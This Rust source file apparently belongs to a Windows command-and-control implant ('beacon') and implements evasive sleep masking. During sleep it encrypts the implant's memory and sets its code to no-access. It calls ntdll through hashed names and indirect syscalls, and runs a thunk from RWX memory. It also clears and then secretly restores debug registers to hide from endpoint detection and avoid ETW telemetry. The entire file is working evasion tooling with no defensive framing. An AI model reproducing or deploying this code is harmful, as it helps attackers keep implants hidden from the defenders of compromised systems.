//! Fluctuation sleep mask — military-grade, CFG/CET immune.
//! Flips .text to PAGE_NOACCESS during sleep, back to RX on wake.

#![cfg(target_os = "windows")]

use crate::resolve;
use core::ffi::c_void;

static ENABLED: core::sync::atomic::AtomicBool = core::sync::atomic::AtomicBool::new(cfg_on());

const fn cfg_on() -> bool {
    match option_env!("NYX_FLUCTUATION_OFF") {
        Some(v) => !(v.len() == 1 && v.as_bytes()[0] == b'1'),
        None => true,
    }
}

pub fn set_enabled(on: bool) {
    ENABLED.store(on, core::sync::atomic::Ordering::Release);
}
pub fn enabled() -> bool {
    ENABLED.load(core::sync::atomic::Ordering::Acquire)
}

pub fn sleep(seconds: u32) {
    if !enabled() {
        crate::beacon::sleep_seconds(seconds);
        return;
    }
    if unsafe { !do_fluctuate(seconds) } {
        crate::beacon::sleep_seconds(seconds);
    }
}

/// RAII: unmask the registered regions on drop. DEFENSE-IN-DEPTH only — the
/// PRIMARY unmask now runs inline in the fluctuation thunk (Step 4 in
/// `fluctuation_thunk`) after the `.text` RX restore, which closes the
/// hardware-exception window that `panic=abort` Drop cannot (a `#PF`/`#AV`
/// during PAGE_NOACCESS sleep terminates the process before Drop runs).
///
/// This guard still earns its keep for the early-`?`/`return` paths inside
/// `do_fluctuate` that occur AFTER `mask()` but BEFORE the thunk runs (e.g. a
/// `transmute`/build failure between `mask()` and `thunk_fn()`): without it
/// those paths would leave the regions encrypted. `unmask()` is idempotent
/// (MASK_STATE CAS), so when the thunk already unmasked, this drop is a no-op.
struct MaskGuard;
impl Drop for MaskGuard {
    fn drop(&mut self) {
        crate::mem::unmask();
    }
}

/// RAII: restore debug registers on drop. Pairs with `clear_dr_state`; ensures
/// the saved DR0-DR7 snapshot is restored even on early scope exit after clear.
struct DrGuard<'a> {
    saved: DrState,
    rt: &'a crate::syscalls::Runtime,
}
impl<'a> Drop for DrGuard<'a> {
    fn drop(&mut self) {
        // SAFETY: restore_dr_state writes debug registers via NtContinue. This
        // is the same operation the original code did explicitly after thunk_fn;
        // wrapping in a Drop guard ensures it runs on early-exit paths too.
        unsafe {
            restore_dr_state(self.rt, &self.saved);
        }
    }
}

unsafe fn do_fluctuate(seconds: u32) -> bool {
    let rt = match crate::syscalls::global() {
        Some(r) => r,
        None => return false,
    };
    let region = match crate::sleep::own_text_region() {
        Some(r) => r,
        None => return false,
    };

    let prot_hash = crate::resolve::djb2(b"ntprotectvirtualmemory");
    let delay_hash = crate::resolve::djb2(b"ntdelayexecution");
    let prot_ssn = match rt.ssn_by_hash(prot_hash) {
        Some(s) => s,
        None => return false,
    };
    let delay_ssn = match rt.ssn_by_hash(delay_hash) {
        Some(s) => s,
        None => return false,
    };
    let prot_tramp = rt.trampoline_for(prot_ssn) as usize;
    let delay_tramp = rt.trampoline_for(delay_ssn) as usize;
    if prot_tramp == 0 || delay_tramp == 0 {
        return false;
    }

    let nt_alloc_va = match resolve::export_addr(b"ntdll.dll", b"NtAllocateVirtualMemory") {
        Some(a) => a,
        None => return false,
    };
    type NtAlloc =
        unsafe extern "system" fn(usize, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
    let alloc: NtAlloc = core::mem::transmute(nt_alloc_va);
    let mut page: *mut c_void = core::ptr::null_mut();
    let mut sz: usize = 0x1000;
    let st = alloc(!0usize, &mut page, 0, &mut sz, 0x3000, 0x40);
    if st < 0 || page.is_null() {
        return false;
    }

    let thunk = crate::fluctuation_thunk::build(
        prot_tramp,
        delay_tramp,
        region.base as usize,
        region.len,
        seconds,
        // CRIT-5: pass `mem::unmask` so the thunk can call it inline after the
        // RX restore, closing the hardware-exception window (see thunk docs).
        // Absolute VA, PIC-stable (the beacon's .text base is fixed for the
        // process lifetime; the thunk is built fresh each sleep but the VA is
        // resolved at build time here).
        crate::mem::unmask as *const () as usize,
    );
    core::ptr::copy_nonoverlapping(thunk.bytes.as_ptr(), page as *mut u8, thunk.len);

    // ---- Countermeasure: DR sanitization during sleep ----
    // Save DR0-DR7, clear them so EDR async thread scans during
    // PAGE_NOACCESS sleep see clean debug registers. Restore
    // atomically via NtContinue after wake (no ETW TI event).
    let saved_dr = save_dr_state(rt);
    clear_dr_state(rt);

    // RAII guards: DEFENSE-IN-DEPTH backstops. The thunk (Step 4) is the
    // PRIMARY unmask/DR-restore path — it runs inline after the RX restore on
    // the always-RX thunk page, so it survives hardware exceptions during
    // sleep that Drop cannot. These guards only fire on early `?`/`return`
    // paths AFTER mask() but BEFORE the thunk runs. Declared so Rust's reverse-
    // declaration drop order runs MaskGuard (unmask) BEFORE DrGuard (restore
    // DR) — matching the original explicit order (unmask .text, then restore
    // HWBPs). Created BEFORE mask() so the encrypted window is always covered.
    let _dr_guard = DrGuard {
        saved: saved_dr,
        rt,
    };
    let _mask_guard = MaskGuard;
    crate::mem::mask();
    let thunk_fn: unsafe extern "system" fn() = core::mem::transmute(page);
    thunk_fn();
    // By here the thunk has ALREADY called mem::unmask() inline (Step 4) after
    // restoring .text to RX, so MaskGuard::drop will hit the idempotency CAS
    // (1→0 already done) and no-op. The guards remain as backstops for any
    // early-exit path that bypassed the thunk.

    let nt_free_va = match resolve::export_addr(b"ntdll.dll", b"NtFreeVirtualMemory") {
        Some(a) => a,
        None => return true,
    };
    type NtFree = unsafe extern "system" fn(usize, *mut *mut c_void, *mut usize, u32) -> i32;
    let free: NtFree = core::mem::transmute(nt_free_va);
    let mut fsz: usize = 0;
    free(!0usize, &mut page, &mut fsz, 0x8000);
    true
}

// ---- DR register save/restore (Countermeasure: sleep-time sanitization) --

/// Debug register snapshot: DR0-DR7.
struct DrState {
    dr0: u64,
    dr1: u64,
    dr2: u64,
    dr3: u64,
    dr6: u64,
    dr7: u64,
    /// Full CONTEXT used for NtContinue restore (only debug regs set).
    ctx_buf: [u8; 1232],
}

/// Save current thread's debug registers via NtGetContextThread.
/// Uses the syscall runtime for indirect syscall (stealthy).
/// Returns None if the runtime is unavailable.
unsafe fn save_dr_state(rt: &crate::syscalls::Runtime) -> DrState {
    let mut buf = [0u8; 1232];
    // CTX_CONTEXT_FLAGS at offset 0x30, CONTEXT_FULL_AMD64 = 0x10001F
    core::ptr::write_unaligned(
        (buf.as_mut_ptr() as usize + 0x30) as *mut u32,
        0x0010_001Fu32,
    );
    // NtGetContextThread(NT_CURRENT_THREAD, ctx_buf)
    let st = crate::syscalls::nt_get_context_thread(
        rt,
        (-1isize) as usize, // NT_CURRENT_THREAD
        buf.as_mut_ptr() as usize,
    );
    let (dr0, dr1, dr2, dr3, dr6, dr7) = if st.unwrap_or(-1) >= 0 {
        (
            core::ptr::read_unaligned((buf.as_ptr() as usize + 0x048) as *const u64),
            core::ptr::read_unaligned((buf.as_ptr() as usize + 0x050) as *const u64),
            core::ptr::read_unaligned((buf.as_ptr() as usize + 0x058) as *const u64),
            core::ptr::read_unaligned((buf.as_ptr() as usize + 0x060) as *const u64),
            core::ptr::read_unaligned((buf.as_ptr() as usize + 0x068) as *const u64),
            core::ptr::read_unaligned((buf.as_ptr() as usize + 0x070) as *const u64),
        )
    } else {
        (0, 0, 0, 0, 0, 0)
    };
    DrState {
        dr0,
        dr1,
        dr2,
        dr3,
        dr6,
        dr7,
        ctx_buf: buf,
    }
}

/// Clear all debug registers on the current thread (DR0-DR7 = 0).
unsafe fn clear_dr_state(rt: &crate::syscalls::Runtime) {
    let mut buf = [0u8; 1232];
    // CONTEXT_DEBUG_REGISTERS = 0x100010
    core::ptr::write_unaligned(
        (buf.as_mut_ptr() as usize + 0x30) as *mut u32,
        0x0010_0010u32,
    );
    // DR0-DR7 are all zero (the buffer is initialized to zero).
    // NtSetContextThread(NT_CURRENT_THREAD, ctx_buf)
    // We use SetContextThread here (not Continue) because we're
    // intentionally clearing DRs BEFORE sleep — this is a one-time
    // sanitization, not a stealth HWBP set. The ETW TI event for
    // clearing DRs is not suspicious (legitimate debuggers do this).
    let _ =
        crate::syscalls::nt_set_context_thread(rt, (-1isize) as usize, buf.as_mut_ptr() as usize);
}

/// Restore debug registers via NtContinue (NO ETW TI — stealth restore).
/// Uses the saved DrState to build a minimal CONTEXT with only the debug
/// registers set. NtContinue applies the register state WITHOUT triggering
/// EtwTiLogSetContextThread.
unsafe fn restore_dr_state(rt: &crate::syscalls::Runtime, saved: &DrState) {
    // Build a minimal CONTEXT for NtContinue with only debug regs set.
    // Use the pre-allocated ctx_buf from the saved state.
    let mut buf = saved.ctx_buf;
    // Only set debug registers in the CONTEXT.
    core::ptr::write_unaligned(
        (buf.as_mut_ptr() as usize + 0x30) as *mut u32,
        0x0010_0010u32, // CONTEXT_DEBUG_REGISTERS
    );
    // Write saved DR values.
    core::ptr::write_unaligned((buf.as_mut_ptr() as usize + 0x048) as *mut u64, saved.dr0);
    core::ptr::write_unaligned((buf.as_mut_ptr() as usize + 0x050) as *mut u64, saved.dr1);
    core::ptr::write_unaligned((buf.as_mut_ptr() as usize + 0x058) as *mut u64, saved.dr2);
    core::ptr::write_unaligned((buf.as_mut_ptr() as usize + 0x060) as *mut u64, saved.dr3);
    core::ptr::write_unaligned((buf.as_mut_ptr() as usize + 0x068) as *mut u64, saved.dr6);
    core::ptr::write_unaligned((buf.as_mut_ptr() as usize + 0x070) as *mut u64, saved.dr7);
    // IMPORTANT: NtContinue restores ALL register state from the CONTEXT,
    // including RIP and RSP. If we only set CONTEXT_DEBUG_REGISTERS, the
    // kernel should only restore debug registers, but to be safe, set
    // RIP/RSP/EFlags to their current values too.
    // Actually, the kernel's NtContinue implementation reads ContextFlags
    // and only restores the segments specified. CONTEXT_DEBUG_REGISTERS
    // (0x100010) means: restore DR0-DR7, Dr6, Dr7 only. RIP/RSP untouched.
    //
    // NtContinue(ContextRecord, RaiseAlert=FALSE)
    let _ = crate::syscalls::nt_continue(
        rt,
        buf.as_mut_ptr() as usize,
        0, // RaiseAlert = FALSE
    );
}
